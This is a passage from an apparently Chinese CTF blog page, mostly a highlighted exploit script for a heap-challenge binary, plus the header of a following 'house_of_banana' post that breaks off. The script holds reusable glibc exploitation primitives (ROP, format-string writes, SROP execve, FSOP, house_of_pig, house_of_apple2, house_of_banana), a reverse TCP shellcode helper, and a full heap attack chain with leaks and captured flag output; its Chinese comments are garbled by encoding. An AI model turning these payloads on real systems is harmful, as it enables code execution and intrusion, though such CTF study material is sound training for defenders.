class="line">    payload += p64(part2)    <span class="comment"># part2 entry will call [r12 + rbx * 0x8]</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">56</span>    <span class="comment"># junk 6 * 8 + 8 = 56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">8</span></span><br><span class="line">    sa(prefix, <span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr2</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xffff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i*<span class="number">2</span>), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xffff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">16</span></span><br><span class="line">    sa(prefix, <span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SROP</span>(<span class="params">rdi, rsp, rip</span>):</span><br><span class="line">    signframe = SigreturnFrame()</span><br><span class="line">    signframe.rax = constants.SYS_execve</span><br><span class="line">    signframe.rdi = rdi</span><br><span class="line">    signframe.rsi = <span class="number">0x0</span></span><br><span class="line">    signframe.rdx = <span class="number">0x0</span></span><br><span class="line">    signframe.rsp = rsp</span><br><span class="line">    signframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(signframe)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>(<span class="params">fake_vtable_addr</span>):</span><br><span class="line">    <span class="comment"># only in glibc 2.23 </span></span><br><span class="line">    <span class="comment"># 2.23+ vtableæœ‰èŒƒå›´æ ¡éªŒ æ­¤æ—¶ä¸å¦‚åˆ«çš„æ‰“æ³•å¥½æ‰“</span></span><br><span class="line">    <span class="comment"># è§¦å‘æ–¹å¼åªè¦èƒ½å‡ºå‘_IO_overflowå³å¯(å…¶å®æœ‰å…³IOæµçš„åªè¦ç»è¿‡vtableåº”è¯¥éƒ½èƒ½æ‰“)</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732f6e69622f</span> <span class="comment"># /bin/sh\x00</span></span><br><span class="line">    fake_IO_FILE.vtable = fake_vtable_addr</span><br><span class="line">    IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_pig</span>(<span class="params">_IO_str_jumps, bin_addr, bin_size, system_addr</span>):</span><br><span class="line">    <span class="comment"># 2.34ä¹‹å‰ä»èƒ½ç”¨house_of_pigæ‰“ï¼Œ2.34ä¹‹åå„ç§hookå‡½æ•°è¢«å¼„æ‰äº† ä¸è¿‡å¯ä»¥çœ‹çœ‹house_of_pig_plus</span></span><br><span class="line">    <span class="comment"># åŸç†ï¼šåªè¦èƒ½è·‘åˆ°_IO_oveflowå°±ä¼šè·³è½¬åˆ°_IO_str_overflowç„¶åå°±ä¼šmalloc-&gt;memcpy-&gt;free  /||gadget</span></span><br><span class="line">    <span class="comment"># å°½é‡ç”³è¯·free_hook - 0x20ç„¶ååˆ©ç”¨_IO_save_base + _IO_backup_baseæ¥å¤„ç†memcpyé‚£éƒ¨åˆ†</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="string">    char *old_buf = fp-&gt;_IO_buf_base; # éœ€è¦æ§åˆ¶_IO_buf_base </span></span><br><span class="line"><span class="string">	size_t old_blen = _IO_blen (fp);</span></span><br><span class="line"><span class="string">	size_t new_size = 2 * old_blen + 100;</span></span><br><span class="line"><span class="string">    new_buf = malloc (new_size); # è®¡ç®—å¥½ç”³è¯·å‡ºæ¥</span></span><br><span class="line"><span class="string">    memcpy (new_buf, old_buf, old_blen); #è¦†ç›–(</span></span><br><span class="line"><span class="string">	free (old_buf);</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_str_jumps</span><br><span class="line">    fake_IO_FILE._IO_buf_base = bin_addr</span><br><span class="line">    fake_IO_FILE._IO_buf_end = bin_addr + <span class="built_in">int</span>((bin_size - <span class="number">100</span>) / <span class="number">2</span>)</span><br><span class="line">    fake_IO_FILE._IO_save_base = system_addr</span><br><span class="line">    fake_IO_FILE._IO_backup_base = system_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_apple2</span>(<span class="params">_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è°ƒç”¨æµä¸º_IO_wfile_overflow-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;Your RIP</span></span><br><span class="line"><span class="string">    _flagsè®¾ç½®ä¸º~(2 | 0x8 | 0x800)ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶rdiï¼Œè®¾ç½®ä¸º0å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—shellï¼Œå¯è®¾ç½®ä¸º  sh;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># main</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732020</span></span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_wfile_jumps</span><br><span class="line">    fake_IO_FILE._wide_data = wide_data_entry</span><br><span class="line">    fake_IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="comment"># wide_data è¿™é‡Œåªè¦æ§åˆ¶vtableå³å¯</span></span><br><span class="line">    pad = p64(<span class="number">0</span>) * <span class="number">36</span></span><br><span class="line">    pad += p64(wide_data_vtable_entry)</span><br><span class="line">    <span class="comment"># wide_data_vtable</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;_wide_data-&gt;_wide_vtable-&gt;doallocateè®¾ç½®ä¸ºåœ°å€Cç”¨äºåŠ«æŒRIPï¼Œå³æ»¡è¶³(B + 0x68) = C&quot;&quot;&quot;</span></span><br><span class="line">    payload = p64(RIP)*<span class="number">0x10</span></span><br><span class="line">    <span class="keyword">return</span> (fake_IO_FILE, pad, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_banana</span>(<span class="params">fake_addr, l_next, gadget, count</span>):</span><br><span class="line">    fake_content = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># l_addr keep zero to array</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(l_next) <span class="comment"># l_next # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr) <span class="comment"># l_real == _ns_loaded # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span> * count) <span class="comment"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">    fake_content += gadget <span class="comment"># reverse_gadget</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x31c</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 0x31c / 0x314</span></span><br><span class="line">    fake_content += p64(<span class="number">0x1c</span>) <span class="comment"># check 2 to l_init_called</span></span><br><span class="line">    <span class="keyword">return</span> fake_content</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;pwncli&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_tcp</span>():</span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line">    reverse_tcp = ShellcodeMall.amd64.reverse_tcp_connect(ip=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">10001</span>)</span><br><span class="line">    <span class="keyword">return</span> reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import CurrentGadgets, gift</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift[&#x27;elf&#x27;] = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">gift[&#x27;libc&#x27;] = ELF()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop_rdi_ret = CurrentGadgets.pop_rdi_ret()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">execve_chain = CurrentGadgets.execve_chain(bin_sh_addr=0x11223344)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc search</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import LibcBox</span></span><br><span class="line"><span class="string">libc_box = LibcBox()</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;system&quot;, 0x640)</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;puts&quot;, 0x810)</span></span><br><span class="line"><span class="string">libc_box.search(download_symbols=False, download_so=False, download_deb=True) # æ˜¯å¦ä¸‹è½½åˆ°æœ¬åœ°</span></span><br><span class="line"><span class="string">read_offset = libc_box.dump(&quot;read&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import get_current_one_gadget_from_libc</span></span><br><span class="line"><span class="string"># è·å–å½“å‰è£…è½½çš„libcçš„gadget</span></span><br><span class="line"><span class="string">all_ogs = get_current_one_gadget_from_libc()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;4. show&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;data: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    sla(prefix, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">magic = u64(rl()[-<span class="number">7</span> -<span class="number">8</span> +<span class="number">1</span>:-<span class="number">1</span>-<span class="number">8</span>+<span class="number">2</span>].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="built_in">hex</span>(magic))</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_heap = leak()</span><br><span class="line">log(<span class="built_in">hex</span>(leak_heap))</span><br><span class="line"></span><br><span class="line">heap_base = leak_heap - <span class="number">0x590</span></span><br><span class="line">log(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_elf = rl()</span><br><span class="line">log((leak_elf))</span><br><span class="line"></span><br><span class="line">leak_elf = ((u64(leak_elf[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))))</span><br><span class="line">log(<span class="built_in">hex</span>(leak_elf))</span><br><span class="line"></span><br><span class="line">elf_base = leak_elf - (<span class="number">0x564a5b203060</span> - <span class="number">0x564a5b000000</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>,</span><br><span class="line">    magic,</span><br><span class="line">    p64(<span class="number">0x510aaaaaaaa</span>),</span><br><span class="line">    leak_heap,</span><br><span class="line">    leak_elf,</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x71</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">magic = u64(rl()[-<span class="number">7</span> -<span class="number">8</span> +<span class="number">2</span>:-<span class="number">1</span>-<span class="number">8</span>+<span class="number">3</span>].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="built_in">hex</span>(magic))</span><br><span class="line">edit(<span class="number">2</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>,</span><br><span class="line">    magic,</span><br><span class="line">    p64(<span class="number">0x30aaaaaaaa</span>),</span><br><span class="line">    heap_base + <span class="number">0x1248</span>,</span><br><span class="line">    elf_base + <span class="number">0x203078</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">leak_libc = leak()</span><br><span class="line">log(<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">log(<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">6</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x91</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">magic = u64(rl()[-<span class="number">7</span> -<span class="number">8</span> +<span class="number">2</span>:-<span class="number">1</span>-<span class="number">8</span>+<span class="number">3</span>].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="built_in">hex</span>(magic))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>,</span><br><span class="line">    magic,</span><br><span class="line">    p64(<span class="number">0x70aaaaaaaa</span>),</span><br><span class="line">    heap_base + <span class="number">0x1448</span>,</span><br><span class="line">    environ - <span class="number">0x28</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">raw = leak()</span><br><span class="line">log(<span class="built_in">hex</span>(raw))</span><br><span class="line"></span><br><span class="line">backdoor = elf_base + <span class="number">0xEAD</span></span><br><span class="line">ret_addr = raw - (<span class="number">0x7ffca6599568</span> - <span class="number">0x7ffca6599448</span>) + <span class="number">0xf0</span> -<span class="number">0xd0</span></span><br><span class="line">log(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x71</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">magic = u64(rl()[-<span class="number">7</span> -<span class="number">8</span> +<span class="number">2</span>:-<span class="number">1</span>-<span class="number">8</span>+<span class="number">3</span>].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="built_in">hex</span>(magic))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>,</span><br><span class="line">    magic,</span><br><span class="line">    p64(<span class="number">0x70aaaaaaaa</span>),</span><br><span class="line">    heap_base + <span class="number">0x15d0</span>,</span><br><span class="line">    raw - <span class="number">0x28</span> - <span class="number">0x28</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(raw))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x60)</span></span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">13</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">flag_path = leak()</span><br><span class="line">log(<span class="built_in">hex</span>(flag_path))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;final&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#14</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x71</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">magic = u64(rl()[-<span class="number">7</span> -<span class="number">8</span> +<span class="number">2</span>:-<span class="number">1</span>-<span class="number">8</span>+<span class="number">3</span>].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="built_in">hex</span>(magic))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>,</span><br><span class="line">    magic,</span><br><span class="line">    p64(<span class="number">0x70aaaaaaaa</span>),</span><br><span class="line">    heap_base + <span class="number">0x15d0</span>,</span><br><span class="line">    flag_path - <span class="number">0x28</span> + <span class="number">0x30</span> + <span class="number">100</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">17</span>)</span><br><span class="line"><span class="comment"># raw = rl()</span></span><br><span class="line"><span class="comment"># log(raw)</span></span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">E=/root</span></span><br><span class="line"><span class="string">abb1</span></span><br><span class="line"><span class="string">r/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;ISEC-f140f382117c6c52cb3a3221e747e530&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/06/house-of-banana/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/06/house-of-banana/" class="post-title-link" itemprop="url">house_of_banana</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-06 15:00:48 / ä¿®æ”¹æ—¶é—´ï¼š15:03:34" itemprop="dateCreated datePublished" datetime="2023-10-06T15:00:48+08:00">2023-10-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.1k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>ç®€ä»‹</h1>
